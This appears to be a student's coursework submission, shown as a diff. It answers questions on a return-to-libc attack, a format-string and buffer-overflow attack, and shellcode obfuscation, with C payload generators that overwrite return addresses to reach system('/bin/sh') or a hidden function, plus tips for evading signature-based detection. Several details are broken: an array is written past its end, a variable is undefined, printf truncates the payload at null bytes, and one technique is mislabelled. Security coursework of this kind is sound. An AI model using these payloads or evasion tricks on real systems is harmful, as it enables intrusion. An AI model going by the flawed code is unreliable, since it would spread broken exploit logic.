@@ -1,0 +1,114 @@
+Question 1: Return-to-libc Attack
+
+a)
+The program has a buffer overflow due to the "gets(buffer)", which does not check the input size, allowing an attacker to overwrite the return address of the function. 
+This attack redirects the execution of the existing "libc" functions functions. For example by setting the return address to system() with "/bin/sh" as its argument, an attacker can spawn a shell which bypasses the non-executable stack protections.
+
+b)
+
+1. Disable ASLR 
+2. system() address --> 0x7ffff7a33450 --> 8
+3. gadget address --> 0x7ffff7b98abc --> 8
+4. buffer size -->  64 bytes --> A * 64
+5. saved return pointer --> 8 bytes after buffer --> B * 8
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main() 
+{
+    char payload[88];  
+
+    memset(payload, 'A', 64);  // Overflow buffer
+    memset(payload + 64, 'B', 8);  // Overwrite saved RBP
+
+    *(long *)(payload + 72) = 0x7ffff7b98abc; // pop rdi; ret
+    *(long *)(payload + 80) = (long) address_of_binsh; // Address of "/bin/sh"
+    *(long *)(payload + 88) = 0x7ffff7a33450; // system()
+
+    printf("%s", payload);
+    return 0;
+}
+
+c)
+A Return-to-libc attack is effective even when the stack execution is disabled because it does not rely on injecting or executing shellcode on the stack. 
+Instead, it reuses existing executable code in the C library (libc) by hijacking the control flow of the program.
+
+
+Question 2: Format String Attack 
+
+a)
+There are two vulnerabilities in this program.
+
+First of all, the buffer overflow. The function "vulnerable function" copies the user input into a buffer[128] using strcpy(buffer,user_input ) which does not check the input lenght.
+So if the user inputs more than 128 bytes ==> overwrites the memory. 
+This means that an attacker can exploit this and get access to the "secret function" by overwriteing the return address.
+
+Second of all, the "printf(user_input);" directly prints user_input without a format string.
+This allows  an attacker to insert %x, %s, or %n directly. 
+This can leak the memory address using "%x" & modify memory values with the "%n".
+
+b)
+An attacker can use the "printf(user_input);" vulnerability to leak memory by printting  values from the stack.
+
+For example an attacker can execute the program using "%08x" as a user input. 
+This will print 4 bytes values from the stack.
+
+c)
+Overflow the buffer = 128 bytes 
+EBP = 4 bytes
+return adress = 4 bytes 
+8 bytes for extra
+
+
+#include <stdio.h>
+#include <string.h>
+
+int main()
+{
+    char payload[144];
+
+    memset(payload, 'A', 132); // 128 + 4 bytes
+
+    payload[132] = 0xb6;
+    payload[133] = 0x84;
+    payload[134] = 0x04;
+    payload[135] = 0x08;
+
+    payload[136] = '\0';
+    printf("%s",payload);
+
+    return 0;
+}
+
+
+Question 3: Shellcode Attack
+
+An attacker can modify the provided shellcode to evade detection by signature-based security tools
+using a lot of methods. Some of them are:
+
+1. Replace certain instructions with equivalent ones to modify the binary signature, known as equivalent opcodes 
+//Original
+xor %rsi, %rsi   // %rsi to 0
+xor %rdx, %rdx   // %rdx to 0
+
+//Modified
+mov $0, %rsi     // equivalent to xor %rsi, %rsi
+mov $0, %rdx     // equivalent to xor %rdx, %rdx
+
+2. Insert harmless instructions that do not affect execution but modify the byte patter, know as dead code insertion
+
+//Original
+syscall         // execute system call
+
+//After
+nop             // junk instruction
+nop             // junk instruction
+syscall         // execute system call
+
+3. Encode the shellcode and decode it at runtime to avoid static detection, known as self-modification
+
+mov $0x41414141, %rdi  // encoded "/bin/sh"
+
+=> the real string gets decoded at runtime, making the detection harder
